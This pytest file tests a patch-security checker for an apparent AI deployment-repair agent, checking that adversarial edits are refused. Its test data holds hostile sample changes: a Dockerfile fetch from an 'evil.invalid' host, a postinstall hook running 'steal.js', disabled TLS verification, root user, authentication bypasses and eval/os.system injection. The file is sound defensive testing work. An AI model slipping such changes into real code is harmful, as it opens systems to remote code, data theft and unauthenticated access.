"""Adversarial changes are refused before any working-copy mutation."""

import json
from unittest.mock import Mock

import pytest

from application.agent import DeploymentTools
from application.patch_security import check_patch_security


@pytest.mark.parametrize(
    "path,before,after",
    [
        ("Dockerfile", "FROM python:3.13\nUSER 65534\n", "FROM python:3.13\nUSER root\n"),
        ("Dockerfile", "FROM python:3.13\nUSER 65534\n", "FROM python:3.13\n"),
        ("Dockerfile", "FROM python:3.13\n", "FROM python:3.13\nADD https://evil.invalid/a /a\n"),
        ("server.js", "const tls={};", "const tls={rejectUnauthorized:false};"),
        ("server.py", "requests.get(url)", "requests.get(url, verify=False)"),
        ("config.py", "mode='verify-full'", "sslmode='disable'"),
    ],
)
def test_known_security_downgrades_are_rejected(path, before, after):
    with pytest.raises(ValueError, match="Security policy"):
        check_patch_security(path, before, after)


def test_node_lifecycle_hook_patch_does_not_change_source_or_checkpoint(tmp_path):
    original = tmp_path / "original"
    original.mkdir()
    old = json.dumps({"scripts": {"start": "node server.js"}})
    new = json.dumps({"scripts": {"start": "node server.js", "postinstall": "node steal.js"}})
    (original / "package.json").write_text(old)
    checkpoint = Mock()
    tools = DeploymentTools(
        original, tmp_path / "work", "a" * 16, {}, Mock(), checkpoint, adapter_factory=Mock()
    )
    tools.read_project_files(["package.json"])
    with pytest.raises(ValueError, match="hook"):
        tools.apply_project_patch("package.json", old, new)
    assert (tools.work / "package.json").read_text() == old
    checkpoint.assert_not_called()


def test_supported_port_and_startup_repair_remains_allowed():
    check_patch_security("server.py", "app.run(host='127.0.0.1')", "app.run(host='0.0.0.0')")
    check_patch_security("package.json", '{"scripts":{}}', '{"scripts":{"start":"node server.js"}}')


AUTHENTICATED = """@login_required
def route(user):
    if not verify_token(user):
        raise HTTPException(status_code=401)
    return database.read()
"""


@pytest.mark.parametrize(
    "candidate",
    [
        AUTHENTICATED.replace("@login_required\n", ""),
        AUTHENTICATED.replace("if not verify_token(user):", "if False:"),
        AUTHENTICATED.replace(
            "    if not verify_token(user):", "    return 'ok'\n    if not verify_token(user):"
        ),
        AUTHENTICATED.replace("status_code=401", "status_code=200"),
        AUTHENTICATED.replace("verify_token(user)", "verify_token(user, verify=False)"),
    ],
)
def test_recognized_python_authentication_cannot_be_removed_or_bypassed(candidate):
    with pytest.raises(ValueError, match="authentication"):
        check_patch_security("app.py", AUTHENTICATED, candidate)


def test_async_database_repair_after_authentication_remains_possible():
    candidate = AUTHENTICATED.replace("def route", "async def route").replace(
        "return database.read()", "return await database.read()"
    )
    check_patch_security("app.py", AUTHENTICATED, candidate)


@pytest.mark.parametrize(
    "expression", ["eval(payload)", "exec(payload)", "os.system(payload)", "subprocess.run(payload)"]
)
def test_deployment_repair_cannot_introduce_dynamic_execution(expression):
    with pytest.raises(ValueError, match="dynamic execution"):
        check_patch_security("app.py", "result = 1", "result = " + expression)


@pytest.mark.parametrize(
    "candidate",
    [
        "from unsafe import verify_token\n",
        "from security import verify_token\nverify_token = lambda user: True\n",
        "from security import verify_token\ndef verify_token(user): return True\n",
    ],
)
def test_auth_helper_import_or_binding_cannot_be_swapped(candidate):
    source = "from security import verify_token\n" + AUTHENTICATED
    with pytest.raises(ValueError, match="authentication"):
        check_patch_security("app.py", source, candidate + AUTHENTICATED)


def test_authenticated_javascript_requires_manual_review_instead_of_syntax_only_approval():
    before = "app.get('/private', requireAuth, async(req,res) => res.json(await db.read()));"
    after = before.replace("requireAuth, ", "")
    with pytest.raises(ValueError, match="manual review"):
        check_patch_security("server.js", before, after)
